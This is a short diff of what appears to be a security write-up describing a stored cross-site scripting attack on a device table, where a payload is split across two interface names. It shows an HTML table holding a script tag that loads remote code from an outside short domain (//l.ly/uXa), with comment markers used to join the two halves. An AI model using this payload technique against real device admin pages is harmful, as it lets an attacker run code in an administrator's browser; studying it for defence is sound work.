@@ -30,7 +30,7 @@ So I thought in buying a short domain like l.ly and host my payload file named a
 
 ```html
 <tr><td>10</td><td><script src=//l.ly/uXa><!--</td><td>f4:96:34:25:65:c5</td><td>192.168.0.44</td></tr>
-<tr><td>10</td><td>--></script></script</td><td>f4:96:34:25:65:c5</td><td>192.168.0.44</td></tr>
+<tr><td>10</td><td>--></script></td><td>f4:96:34:25:65:c5</td><td>192.168.0.44</td></tr>
 ```
 
 I just splitted the payload on my 2 interfaces, the first interface receives the follow payload,
